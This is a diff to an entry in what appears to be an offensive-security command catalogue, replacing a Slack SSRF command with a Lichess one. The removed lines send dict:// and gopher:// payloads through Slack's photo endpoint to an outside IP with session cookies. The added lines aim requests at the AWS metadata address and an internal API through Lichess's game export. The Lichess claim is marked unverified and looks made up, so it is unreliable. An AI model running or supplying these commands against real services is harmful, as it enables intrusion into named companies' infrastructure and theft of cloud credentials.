@@ -1,14 +1,12 @@
 ---
-id: cmd-curl-ssrf-slack
+id: cmd-curl-ssrf-001
 data: >-
-  curl -X POST 'https://whitehataudit.slack.com/account/photo' -H 'Referer:
-  https://whitehataudit.slack.com/account/photo?url=http://95.211.198.76:5555/picture-54679.jpg'
-  --data-raw
-  'crumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85'
-  -b 'cookies_here'
+  curl
+  "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/"
+  -v
 tags:
   - ssrf
-  - http-request
+  - http
 type: command
 output: null
 executor: bash
@@ -17,56 +15,49 @@ platforms:
   - macOS
   - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T04:39:02.439Z'
+updated_at: '2025-12-14T17:32:48.376Z'
 verified: false
 validated: true
 submitted: true
 ---
-# curl-send-ssrf-request
+# Curl Send SSRF Request
 
 ## Command
 
 ```bash
-curl -X POST 'https://whitehataudit.slack.com/account/photo' \
-  -H 'Referer: https://whitehataudit.slack.com/account/photo?url=http://95.211.198.76:5555/picture-54679.jpg' \
-  --data-raw 'crumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85' \
-  -b 'cookies_here'
+curl "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/" -v
 ```
 
 ## Description
 
-Sends a POST request to Slack's photo upload endpoint with a malicious URL parameter to trigger SSRF using protocol wrappers. Include authentication cookies for valid session.
+This command sends a GET request to the Lichess game export API, injecting a malicious URL into the 'players' parameter to exploit SSRF and trigger a server-side request to the AWS metadata endpoint.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | Specifies POST method | Yes |
-| `-H 'Referer: ...'` | Sets referer header with HTTP URL variant | Yes |
-| `--data-raw '...'` | POST body with crumb, crop, url (malicious), cropbox | Yes |
-| `-b 'cookies_here'` | Authentication cookies | Yes |
+| `[GAME_ID]` | Valid Lichess game identifier (e.g., abc123def456) | Yes |
+| `?players=...` | Arbitrary URL to force server request (e.g., AWS metadata) | Yes |
+| `-v` | Verbose output for debugging | No |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST 'https://example.slack.com/account/photo' --data-raw 'url=dict://attacker-ip:port/path'
+curl "https://lichess.org/game/export/abc123def456?players=http://169.254.169.254/latest/meta-data/" -v
 ```
 
 ### Advanced Usage
 
-Vary 'url' for protocols: replace 'dict://' with 'gopher://', etc.
-
 ```bash
-curl -X POST 'https://whitehataudit.slack.com/account/photo' --data-raw 'url=gopher://95.211.198.76:6655/!GET /path HTTP/1.1\r\nHost: 95.211.198.76\r\n\r\n'
+curl "https://lichess.org/api/games/user/username?players=http://internal-api.example.com/secret" -H "User-Agent: Mozilla/5.0" -v
 ```
 
 ## Expected Output
 
-HTTP 200 OK or redirect response from Slack; SSRF triggers backend fetch without client error.
+Verbose HTTP response from Lichess (e.g., 200 OK with game data), but the real impact is server-side; check for indirect signs like delayed response or use verification tools.
 
 ## Related
 
-- [[commands/nc-listen-verbose]]
-- [[procedures/Send-Malicious-POST-Request-for-SSRF-Exploitation]]
+- [[Related Procedure: Craft Malicious Request to Game Export Endpoint]]
